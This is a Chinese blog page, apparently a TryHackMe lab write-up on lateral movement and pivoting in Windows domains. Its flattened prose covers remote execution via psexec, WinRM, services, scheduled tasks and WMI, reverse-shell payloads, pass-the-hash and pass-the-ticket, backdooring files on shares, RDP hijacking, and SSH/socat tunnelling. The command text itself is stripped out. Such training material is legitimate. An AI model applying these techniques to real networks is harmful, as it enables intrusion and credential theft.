<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-Lateral Movement and Pivoting | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-Lateral Movement and Pivoting"><meta name="application-name" content="THM-Lateral Movement and Pivoting"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-Lateral Movement and Pivoting"><meta property="og:url" content="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 简介 在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具. 建议在此之前先浏览一下入侵 AD 和枚举 AD 房间。 学习目标  熟悉攻击者使用的横向移动技术。 了解如何使用替代认证材料进行横向移动"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 简介 在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具. 建议在此之前先浏览一下入侵 AD 和枚举 AD 房间。 学习目标  熟悉攻击者使用的横向移动技术。 了解如何使用替代认证材料进行横向移动"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-Lateral Movement and Pivoting',
  postAI: '',
  pageFillDescription: '0x01 简介, 学习目标, 索取您的凭证, 0x02 通过网络移动, 什么是横向运动？, 一个简单的例子, 攻击者的视角, 管理员和UAC, 0x03 远程生成过程, Psexec 执行程序, 使用 WinRM 远程创建进程, 使用 sc 远程创建服务, 远程创建计划任务, 实践练习, 0x04 使用 WMI 横向移动, 从 Powershell 连接到 WMI, 使用 WMI 远程创建进程, 使用 WMI 远程创建服务, 使用 WMI 远程创建计划任务, WMI 通过 WMI 安装 MSI 包, 实践练习, 0x05 使用替代认证材料, NTLM认证, 传递哈希值, 从本地 SAM 中提取 NTLM 哈希值, 从 LSASS 内存中提取 NTLM 哈希值, 使用 Linux 传递哈希, Kerberos 身份验证, 传票, 跨越哈希/传递密钥, 实践练习, Pass-the-Hash, Pass-the-Ticket, Pass-the-Key, 0x06 滥用用户行为, 滥用可写股份, 后门 .vbs 脚本, .exe 文件后门, RDP劫持, 实践练习, 0x07 端口转发, SSH 隧道, SSH 远程端口转发, SSH 本地端口转发, 使用 socat 进行端口转发, 动态端口转发和 SOCKS, 实践练习, 隧道复杂漏洞, 0x08 参考文章简介在这个房间里我们将研究横向移动攻击者使用一组技术在网络中移动同时创建尽可能少的警报我们将了解为此目的而使用的几种常见技术以及所涉及的工具建议在此之前先浏览一下入侵和枚举房间学习目标熟悉攻击者使用的横向移动技术了解如何使用替代认证材料进行横向移动了解使用受感染主机作为枢纽的不同方法索取您的凭证为了模拟违规您将获得第一组凭据网络设置完成后在攻击箱上导航至以请求您的凭据对单击获取凭据按钮以接收可用于初始访问的凭据对此凭证对将为您提供对的访问可以被视为进入该环境的跳转主机模拟您已实现的立足点对于访问您可以使用以下命令获取到的凭证如下即通过网络移动什么是横向运动简而言之横向移动是攻击者用来在网络中移动的一组技术一旦攻击者获得对网络第一台计算机的访问权出于多种原因移动就变得至关重要其中包括实现攻击者的目标绕过现有的网络限制建立额外的网络入口点制造混乱和避免被发现虽然许多网络杀伤链将横向移动视为线性过程的附加步骤但它实际上是循环的一部分在此周期中我们使用任何可用的凭据来执行横向移动使我们能够访问新机器在其中我们可以提升权限并提取凭据如果可能有了新的凭证循环又开始了通常我们会重复这个循环几次然后才能达到网络上的最终目标如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机那么我们可能需要横向移动到在网络上拥有更多权限的其他主机一个简单的例子假设我们正在执行红队参与我们的最终目标是到达内部代码存储库我们通过网络钓鱼活动在目标网络上获得了第一次妥协通常网络钓鱼活动对非技术用户更有效因此我们的第一次访问可能是通过营销部门的机器进行的营销工作站通常会受到防火墙策略的限制无法访问网络上的任何关键服务包括管理协议数据库端口监控服务或日常工作不需要的任何其他服务包括代码存储库为了到达敏感的主机和服务我们需要转移到其他主机并从那里转向我们的最终目标为此我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值如果我们找到本地管理员则其他主机上可能存在相同的帐户经过一番侦察我们发现了一个名为的工作站我们使用本地管理员的密码哈希来访问并确认它属于公司的一位开发人员所有从那里可以访问我们的目标代码存储库请注意虽然可能需要使用横向移动来规避防火墙限制但它也有助于逃避检测在我们的示例中即使营销工作站可以直接访问代码存储库也可能需要通过开发人员的进行连接从检查登录审核日志的蓝队分析师的角度来看这种行为的可疑性较小攻击者的视角攻击者可以通过多种方式进行横向移动最简单的方法是使用标准管理协议例如或连接到网络上的其他计算机只要在规划与哪个帐户连接的位置时保持一定的一致性这种方法就可以在某种程度上模拟常规用户的行为虽然部门的用户通过连接到服务器可能很常见并且不会受到关注但必须注意不要尝试可疑的连接例如为什么本地管理员用户从营销部门连接到个人电脑如今攻击者还可以使用其他横向移动方法同时使蓝队有效检测正在发生的情况变得更具挑战性虽然没有任何技术应该被认为是万无一失的但我们至少可以尝试尽可能保持沉默在接下来的任务中我们将了解一些最常见的横向运动技术管理员和在执行整个房间中介绍的大部分横向移动技术时我们将主要使用管理员凭据虽然人们可能期望每个管理员帐户都具有相同的目的但必须区分两种类型的管理员本地帐户属于本地管理员组域帐户属于本地管理员组我们感兴趣的差异是用户帐户控制对本地管理员默认管理员帐户除外施加的限制默认情况下除非通过使用交互式会话否则本地管理员将无法远程连接到计算机并执行管理任务将拒绝通过或请求的任何管理任务因为此类管理员将使用经过过滤的介质完整性令牌登录从而防止帐户执行特权操作唯一获得完全权限的本地帐户是默认管理员帐户具有本地管理权限的域帐户不会受到相同的处理并且将以完全管理权限登录如果需要可以禁用此安全功能有时您会发现管理员组中的本地帐户和域帐户之间没有区别不过重要的是要记住如果某些横向移动技术失败可能是由于使用了强制执行的非默认本地管理员您可以在此处阅读有关此安全功能的更多详细信息远程生成过程此任务将研究攻击者远程生成进程的可用方法允许他们在拥有有效凭据的计算机上运行命令所讨论的每种技术都使用略有不同的方法来实现相同的目的其中一些可能更适合某些特定场景执行程序所需的组成员身份管理员多年来一直是需要远程执行进程时的首选方法它允许管理员用户在他有权访问的任何上远程运行命令是众多工具之一可以在此处下载的工作方式如下连接到共享并上传服务二进制文件使用作为名称连接到服务控制管理器以创建并运行名为的服务并将服务二进制文件与关联创建一些命名管道来处理要运行我们只需提供远程主机所需的管理员凭据以及我们要运行的命令为方便起见可在中的下找到使用远程创建进程所需的组成员身份远程管理用户远程管理是一种基于的协议用于远程向主机发送命令大多数安装都会默认启用这使其成为一个有吸引力的攻击媒介要从命令行连接到远程会话我们可以使用以下命令我们可以从实现相同的目的但要传递不同的凭据我们需要创建一个对象获得对象后我们可以使用创建交互式会话还包括它通过远程运行凭证也必须通过对象传递使用远程创建服务端口基于命名管道的基于命名管道的所需的组成员身份管理员服务也可用于运行任意命令因为它们在启动时执行命令虽然服务可执行文件在技术上与常规应用程序不同但如果我们配置服务来运行任何应用程序它仍然会执行该应用程序并随后失败我们可以使用中提供的标准工具在远程主机上创建服务使用时它会通过几种方式尝试通过连接到远程服务程序将使用进行连接尝试客户端将首先在端口连接到端点映射器该端点映射器充当可用端点的目录并请求有关服务程序的信息然后将响应和端口以连接到该端口通常是范围内的动态端口如果后一个连接失败将尝试通过端口或基于的上的命名管道到达我们可以使用以下命令创建并启动名为的服务服务启动时将执行命令在系统上创建一个新的本地用户由于操作系统负责启动服务因此您将无法查看命令输出要停止并删除该服务我们可以执行以下命令远程创建计划任务我们可以使用的另一个功能是计划任务您可以使用远程创建并运行一个任务该任务可在任何安装中使用要创建名为的任务我们可以使用以下命令我们将计划类型设置为这意味着该任务仅在指定的时间和日期运行一次由于我们将手动运行任务因此开始日期和开始时间无论如何都不重要由于系统将运行计划任务因此我们将无法获得该命令的输出这使得这是一种盲目攻击最后要删除计划任务我们可以使用以下命令并自行清理实践练习对于本练习我们假设我们已经捕获了一些具有管理访问权限的凭据我们将展示如何使用这些凭据通过横向移动到请随意尝试其他方法因为它们都应该适用于虽然我们已经展示了如何使用在远程系统上创建用户通过使用但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联但是如果我们尝试使用此方法运行反向我们会注意到反向在执行后立即断开连接原因是服务可执行文件与标准文件不同因此非服务可执行文件几乎会立即被服务管理器杀死对我们来说幸运的是支持格式它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中防止其被杀死要创建反向我们可以使用以下命令注意由于您将与其他人共享实验室因此您需要为有效负载使用不同的文件名而不是以避免覆盖其他人的有效负载然后我们将继续使用凭据使用中的将有效负载上传到的共享上传可执行文件后我们将在攻击者的计算机上设置一个侦听器以接收来自的反向或者您可以在控制台上运行以下单行代码来执行相同的操作由于不允许我们在命令中指定凭据因此我们需要使用使用的访问令牌生成一个新尽管如此我们只能通过访问计算机因此如果我们尝试类似的内容新的命令提示符将在用户会话中生成但我们无法访问它为了解决这个问题我们可以使用生成带有访问令牌的第二个反向注意请记住由于您将与选项一起使用因此不会费心检查所提供的凭据是否有效有关此的更多信息请参阅枚举室因此请务必正确输入密码如果不这样做您稍后会在房间中看到一些错误我们可以像往常一样在中使用接收反向连接最后继续使用远程创建一个新服务并将其与我们上传的二进制文件关联起来请务必更改您的服务名称以避免与其他学生发生冲突启动该服务后您应该会在中收到一个连接您可以从该连接访问桌面上的第一个标志使用横向移动我们还可以使用以不同的方式执行上一个任务中讨论的许多技术是基于的企业管理的实现是跨设备访问管理信息的企业标准简单来说允许管理员执行标准管理任务攻击者可以滥用这些任务以各种方式执行横向移动我们将对此进行讨论从连接到在能够使用命令连接到之前我们需要使用我们的用户和密码创建一个对象该对象将存储在变量中并在该任务的整个技术中使用然后我们继续使用以下协议之一建立会话将用于连接到该协议使用端口和端口正如使用时所解释的那样将用于连接到此协议使用端口或要从建立会话我们可以使用以下命令并将会话存储在变量中我们将在整个房间中使用不同的技术用于配置会话的连接选项包括连接协议然后选项和凭据将传递到以建立针对远程主机的会话使用远程创建进程或所需的组成员身份管理员我们可以利用从远程生成一个进程向类发送请求以在我们之前创建的会话下生成该进程请注意不允许您查看任何命令的输出但确实会静默创建所需的进程在旧系统上可以在命令提示符下使用完成相同的操作使用远程创建服务或所需的组成员身份管理员我们可以通过使用创建服务要创建名为的服务我们可以使用以下命令然后我们可以获取该服务的句柄并使用以下命令启动它最后我们可以使用以下命令停止并删除该服务使用远程创建计划任务或所需的组成员身份管理员我们可以使用默认安装中提供的一些创建并执行计划任务要在使用完计划任务后将其删除我们可以使用以下命令通过安装包或所需的组成员身份管理员是一种用于安装程序的文件格式如果我们可以将包复制到目标系统那么我们就可以使用尝试为我们安装它攻击者可以通过任何可用的方式复制该文件一旦文件位于目标系统中我们就可以尝试通过调用类来安装它我们可以通过在遗留系统中使用来实现相同的目的实践练习对于本练习我们假设我们已经捕获了一些具有管理访问权限的凭据用户我们将展示如何使用这些凭据通过和包横向移动到请随意尝试此任务中介绍的其他方法我们将首先从攻击者机器上使用创建有效负载注意由于您将与其他人共享实验室因此您需要为有效负载使用不同的文件名而不是以避免覆盖其他人的有效负载然后我们使用或任何其他可用的方法复制有效负载由于我们将有效负载复制到共享因此它将在服务器上的中可用我们启动一个处理程序来接收来自的反向让我们从控制台启动针对的会话然后我们从类调用方法来触发有效负载因此您应该在中收到一个连接您可以通过该连接访问桌面上的标志使用替代认证材料通过替代身份验证材料我们指的是可用于访问帐户而无需实际知道用户密码本身的任何数据这是可能的因为网络使用的某些身份验证协议的工作方式在此任务中我们将研究当网络上存在以下任一身份验证协议时可作为用户登录的几种替代方案认证身份验证注意在此任务中假定您熟悉从主机提取凭据的方法和工具将被用作整个房间中凭证提取的首选工具认证在深入研究实际的横向移动技术之前我们先看一下身份验证的工作原理客户端向他们想要访问的服务器发送身份验证请求服务器生成一个随机数并将其作为质询发送给客户端客户端将其密码哈希与质询以及其他已知数据结合起来生成对质询的响应并将其发送回服务器进行验证服务器将质询和响应转发给域控制器进行验证域控制器使用质询重新计算响应并将其与客户端发送的初始响应进行比较如果两者匹配则客户端通过身份验证否则访问将被拒绝认证结果发送回服务器服务器将认证结果转发给客户端注意所描述的过程适用于使用域帐户时如果使用本地帐户服务器可以验证对质询本身的响应而无需与域控制器交互因为它的上本地存储有密码哈希值传递哈希值从我们获得管理权限的主机中提取凭据通过使用或类似工具后我们可能会获得可以轻松破解的明文密码或哈希值然而如果我们不够幸运我们最终会得到未破解的密码哈希值尽管我们似乎无法真正使用这些哈希值但只需知道密码哈希值即可响应身份验证期间发送的质询这意味着我们可以在不需要知道明文密码的情况下进行身份验证如果域配置为使用身份验证则无需破解哈希值我们就可以传递哈希值并成功进行身份验证要提取哈希值我们可以使用读取本地或直接从内存中提取哈希值从本地中提取哈希值此方法仅允许您从计算机上的本地用户获取哈希值没有域用户的哈希值可用从内存中提取哈希值此方法将允许您提取本地用户和最近登录到计算机的任何域用户的任何哈希值然后我们可以使用提取的哈希值来执行攻击方法是使用在反向或您喜欢的任何其他命令上为受害者用户注入访问令牌如下所示请注意我们使用来重新建立原始令牌权限因为尝试使用提升的令牌传递哈希将不起作用这相当于使用但使用哈希而不是密码并将生成一个新的反向我们可以从其中以受害者用户身份启动任何命令要接收反向我们应该在上运行反向侦听器有趣的是如果您在此上运行命令它仍然会显示您在执行之前使用的原始用户但从这里运行的任何命令实际上都会使用我们使用注入的凭据使用传递哈希如果您可以访问盒子如有几个工具具有内置支持可以使用不同的协议执行根据您可以使用的服务您可以执行以下操作使用连接到使用通过连接注意仅版本的支持使用连接到身份验证让我们快速了解一下身份验证在网络上的工作原理用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到密钥分发中心该服务通常安装在域控制器上负责在网络上创建票证将创建并发回票证授予票证允许用户请求票证来访问特定服务而无需将其凭据传递给服务本身与一起还将向用户提供会话密钥用户将需要该会话密钥来生成后续请求请注意使用帐户的密码哈希进行加密因此用户无法访问其内容重要的是要知道加密的包括会话密钥的副本作为其内容的一部分并且不需要存储会话密钥因为它可以在需要时通过解密来恢复副本当用户想要连接到网络上的服务例如共享网站或数据库时他们将使用向请求票证授予服务是只允许连接到为其创建的特定服务的票证要请求用户将发送他的用户名和使用会话密钥加密的时间戳以及和服务主体名称该名称指示我们打算访问的服务和服务器名称因此将向我们发送和服务会话密钥我们需要对我们想要访问的服务进行身份验证使用服务所有者哈希进行加密服务所有者是运行服务的用户或计算机帐户在其加密内容上包含服务会话密钥的副本以便服务所有者可以通过解密来访问它然后可以将发送到所需的服务以进行身份验证并建立连接该服务将使用其配置的帐户的密码哈希来解密并验证服务会话密钥传票有时可以使用从内存中提取票证和会话密钥该过程通常需要我们在被攻击的机器上拥有权限可以按如下方式完成请注意如果我们只能访问票证而不能访问其相应的会话密钥则我们将无法使用该票证因此两者都是必要的虽然可以从进程的内存中提取任何可用的或但大多数时候我们会对感兴趣因为它们可用于请求访问允许用户访问的任何服务同时仅适用于特定服务提取需要我们拥有管理员凭据并且可以使用低权限帐户仅分配给该帐户的帐户来提取一旦我们提取了所需的票证我们就可以使用以下命令将票证注入当前会话在我们自己的会话中注入票证不需要管理员权限此后我们用于横向移动的任何工具都可以使用门票要检查票证是否已正确注入您可以使用命令跨越哈希传递密钥这种攻击与类似但适用于网络当用户请求时他们会发送使用从其密码派生的加密密钥加密的时间戳用于派生此密钥的算法可以是在当前版本上默认禁用或具体取决于安装的版本和配置如果我们拥有这些密钥中的任何一个我们就可以向请求而无需实际密码因此得名传递密钥我们可以通过使用和以下命令从内存中获取加密密钥根据可用的密钥我们可以在上运行以下命令以通过密钥传递来获取反向为方便起见中已提供如果我们有哈希如果我们有哈希如果我们有哈希请注意使用时密钥将等于用户的哈希值这意味着如果我们可以提取哈希只要是启用的协议之一我们就可以使用它来请求这种特殊的变体通常被称为要接收反向我们应该在上运行反向侦听器就像一样从此运行的任何命令都将使用通过注入的凭据实践练习要开始本练习您需要使用以下凭据通过连接到用户这些凭据将授予您对的管理访问权限允许您使用转储执行此任务期间提供的任何技术所需的身份验证材料使用会话使用提取身份验证材料并针对域用户执行或一旦您的命令提示符已加载其凭据请使用连接到上的命令提示符由于任何攻击都已将的凭据注入到您的会话中因此您可以使用而不指定任何凭据并且它将使用当前会话可用的凭据您会在上的桌面上找到一个标志和均可在上的处获取首先就是获取计算机上用户的哈希值或者我使用的后者接着找到目标用户对应的值如下图所示然后我们可以使用提取的哈希值来执行攻击方法是使用在反向或您喜欢的任何其他命令上为受害者用户注入访问令牌如下所示请注意我们使用来重新建立原始令牌权限因为尝试使用提升的令牌传递哈希将不起作用成功拿到接着执行如下命令一旦您的命令提示符已加载其凭据请使用连接到上的命令提示符由于任何攻击都已将的凭据注入到您的会话中因此您可以使用而不指定任何凭据并且它将使用当前会话可用的凭据您会在上的桌面上找到一个标志和均可在上的处获取如果在目标机拥有管理员权限则可以使用该方法请注意如果我们只能访问票证而不能访问其相应的会话密钥则我们将无法使用该票证因此两者都是必要的如上图我们获取到了目标用户的票证一旦我们提取了所需的票证我们就可以使用以下命令将票证注入当前会话在我们自己的会话中注入票证不需要管理员权限此后我们用于横向移动的任何工具都可以使用门票要检查票证是否已正确注入您可以使用命令可以看到我们成功注入会话成功进入目标用户的可以看到目标用户可以使用算法以及这里就用了这里也是成功拿到不过恰好靶机重置了没截到图这里就算了滥用用户行为在某些情况下攻击者可以利用用户执行的操作来进一步访问网络中的计算机虽然发生这种情况的方式有很多种但我们将讨论一些最常见的方式滥用可写股份在检查公司环境时经常会发现合法用户用来执行日常任务的网络共享如果这些共享由于某种原因是可写的攻击者就可以植入特定文件来强制用户执行任意有效负载并获得对其计算机的访问权限一种常见的情况是查找网络共享上托管的脚本或可执行文件的快捷方式其背后的基本原理是管理员可以在网络共享上维护可执行文件并且用户可以执行它而无需将应用程序复制或安装到每个用户的计算机上如果我们作为攻击者拥有对此类脚本或可执行文件的写入权限我们就可以对它们进行后门以强迫用户执行我们想要的任何有效负载尽管脚本或可执行文件托管在服务器上但当用户在其工作站上打开快捷方式时可执行文件将从服务器复制到其文件夹并在工作站上执行因此任何有效负载都将在最终用户工作站和登录用户帐户的上下文中运行后门脚本例如如果共享资源是脚本我们可以将的副本放在同一个共享上并在共享脚本中注入以下代码这会将从共享复制到用户工作站目录并在用户打开共享脚本时向攻击者发送反向文件后门如果共享文件是二进制文件例如您可以从共享下载它并使用向其中注入后门该二进制文件仍将照常工作但会静默执行额外的有效负载要创建后门我们可以使用以下命令生成的将在用户没有注意到的情况下执行有效负载文件生成后我们可以替换共享上的可执行文件并使用中的模块等待任何连接劫持当管理员使用远程桌面连接到计算机并关闭客户端而不是注销时他的会话将无限期地在服务器上保持打开状态如果您在及更早版本上拥有系统权限则无需密码即可接管任何现有会话如果我们有管理员级别的访问权限我们可以通过我们喜欢的任何方法获取现在我们将使用来执行此操作首先让我们以管理员身份运行从那里运行可在处获取要列出服务器上现有的会话可以使用以下命令根据上面的命令输出如果我们当前使用管理员用户通过连接我们的将为我们还可以看到名为的用户打开了一个为的会话任何具有光盘状态的会话都已被用户保持打开状态并且目前未被使用虽然您也可以接管活动会话但当您这样做时合法用户将被迫退出其会话他们可能会注意到这一点要连接到会话我们将使用并指定我们将接管的会话以及当前的按照前面的示例如果我们以管理员用户身份连接要接管的会话我们将使用以下命令简单来说该命令指出拥有的图形会话应与管理员用户拥有的会话连接因此我们将恢复的会话并立即连接到它注意不允许您在不知道密码的情况下连接到其他用户的会话实践练习要完成此练习您需要使用从获取的一组新凭据连接到请注意此链接与其他任务不同获得凭据后通过连接到这些凭据将授予您对的管理访问权限对于此任务我们将劫持会话如果您有兴趣尝试在或其他文件中添加后门您可以在本地持久性室中找到一些与此相关的练习按照说明劫持在上的会话以获取您的标志注意执行时您将看到几个名为的用户后跟一个数字这些只是同一用户的相同副本您可以劫持其中任何一个您不需要劫持全部确保劫持标记为已断开连接的会话光盘以避免干扰其他用户当我们以管理员打开之后运行如下命令接着列出服务器上所有的会话要连接到会话我们将使用并指定我们将接管的会话以及当前的按照前面的示例如果我们以管理员用户身份连接要接管的会话我们将使用以下命令简单来说该命令指出拥有的图形会话应与管理员用户拥有的会话连接如下图成功窃取到会话端口转发我们提出的大多数横向移动技术都需要特定端口可供攻击者使用在现实网络中管理员可能出于安全原因阻止了其中一些端口或者在网络周围实施了分段从而阻止您访问或端口为了绕过这些限制我们可以使用端口转发技术其中包括使用任何受感染的主机作为跳转盒来转向其他主机预计某些机器将比其他机器拥有更多的网络权限因为企业中的每个角色在日常工作所需的网络服务方面都有不同的需求隧道我们要研究的第一个协议是因为它已经具有通过称为隧道的功能进行端口转发的内置功能虽然曾经是与系统相关的协议但现在默认附带客户端因此您可以在当今的许多系统中找到它而与操作系统无关隧道可以以不同的方式使用通过连接转发端口我们将根据情况使用它为了解释每种情况我们假设一个场景我们已经获得了对机器的控制权不需要管理员访问权限并且希望将其用作访问另一台机器上的端口的枢纽我们无法直接连接我们将启动一条从计算机充当客户端到攻击者充当服务器的隧道这样做的原因是您经常会在计算机上找到客户端但大多数时候没有可用的服务器由于我们将连接回攻击者的计算机因此我们希望在其中创建一个用户而无需访问任何隧道控制台并设置用于创建隧道的密码根据您的需要隧道可用于执行本地或远程端口转发让我们看一下每个案例远程端口转发在我们的示例中假设防火墙策略阻止攻击者的计算机直接访问服务器上的端口如果攻击者之前已入侵并且可以访问服务器的端口则可以使用的远程端口转发将其转移到端口远程端口转发允许您从客户端在本例中为获取可访问的端口并将其投射到远程服务器攻击者的计算机中结果攻击者的计算机上将打开一个端口可用于通过隧道连接回服务器中的端口反过来将代理连接以便服务器将看到所有流量就好像它来自一样此时可能会出现的一个有效问题是如果我们已经破坏了并且可以直接从那里运行会话为什么我们需要端口转发答案很简单在我们只能通过控制台访问的情况下我们将无法使用任何客户端因为我们没有通过使攻击者的计算机可以使用该端口您可以使用客户端进行连接当您想要针对无法直接访问的端口运行漏洞利用时会出现类似的情况因为您的漏洞利用可能需要特定的脚本语言而这种语言可能并不总是在您妥协的计算机上可用参考上图要将服务器上的端口转发回攻击者的计算机我们可以在上使用以下命令这将使用用户建立从到攻击者的会话由于不允许在攻击者上运行因此我们需要使用开关运行命令以防止客户端请求一个否则连接将立即退出开关用于请求远程端口转发语法要求我们首先指示将在服务器上打开的端口后跟冒号然后是和端口我们将转发的套接字的名称请注意端口号不需要匹配但在本示例中需要匹配命令本身不会输出任何内容但隧道将取决于要运行的命令无论何时我们都可以像使用任何其他命令一样按来关闭隧道一旦我们的隧道设置并运行我们就可以访问攻击者的计算机并通过进入转发端口来到达服务器本地端口转发本地端口转发允许我们将端口从服务器拉到客户端在我们的场景中这可用于获取攻击者计算机中可用的任何服务并通过上的端口使其可用这样任何无法直接连接到攻击者但可以连接到的主机现在都可以通过枢轴主机访问攻击者的服务使用这种类型的端口转发将允许我们从通常无法连接回我们的主机上运行反向或者仅仅是使我们想要的任何服务对于没有直接连接到我们的机器的机器可用要从攻击者的计算机转发端口并使其可从访问我们可以在上运行以下命令该命令结构与远程端口转发中使用的命令结构类似但使用选项进行本地端口转发此选项要求我们指示用于接收连接的本地套接字以及从攻击者的角度连接的远程套接字请注意我们在第二个套接字中使用地址从攻击者的角度来看这是持有要转发的端口的主机由于我们在上打开一个新端口因此我们可能需要添加防火墙规则以允许传入连接使用为此需要管理权限设置隧道后任何将浏览器指向的的用户都会看到攻击者计算机发布的网站使用进行端口转发在不可用的情况下可用于执行类似的功能虽然不如灵活但允许您以更简单的方式转发端口使用的缺点之一是我们需要将其传输到枢轴主机在我们当前的示例中为使其比更容易被检测到但在没有其他选项可用的情况下可能值得一试使用执行端口转发的基本语法要简单得多如果我们想打开主机上的端口并将我们收到的任何连接转发到主机上的端口您将使用以下命令选项允许为收到的每个连接创建一个新进程从而可以在不关闭的情况下处理多个连接如果不包含它将在第一个连接完成时关闭回到我们的示例如果我们想像使用远程端口转发一样使用作为枢纽来访问服务器上的端口我们可以使用以下命令请注意无法像那样将连接直接转发到攻击者的计算机但会在上打开一个端口攻击者的计算机随后可以连接到该端口像往常一样由于在枢轴主机上打开了一个端口我们可能需要创建一个防火墙规则以允许到该端口的任何连接另一方面如果我们想从攻击者的机器公开端口以便服务器可以访问它我们只需要稍微调整一下命令结果将生成端口并侦听要转发到攻击者计算机上的端口的连接动态端口转发和虽然单端口转发对于需要访问特定套接字的任务非常有效但有时我们可能需要通过枢轴主机对主机的许多端口甚至跨多台计算机的许多端口运行扫描在这些情况下动态端口转发允许我们通过主机进行旋转并使用代理与我们想要的任何地址端口建立